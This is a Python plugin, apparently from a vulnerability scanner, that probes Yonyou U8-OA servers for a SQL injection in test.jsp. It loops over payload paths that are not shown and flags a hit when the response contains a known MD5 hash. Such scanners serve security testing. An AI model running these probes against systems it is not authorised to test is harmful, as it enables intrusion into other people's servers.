#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def u8_oa_test_sqlinject_scan(self, url):
    ''' 由于与致远OA使用相同的文件, 于是存在同样的漏洞 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name + 'U8-OA'
    vul_info['vul_type'] = 'SQLinject'
    vul_info['vul_id'] = 'Yonyou-u8-test.jsp-sqlinject'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.yonyou_u8_oa_test_sqlinject_payloads:
        path = payload['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=self.headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if ('c4ca4238a0b923820dcc509a6f75849b' in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
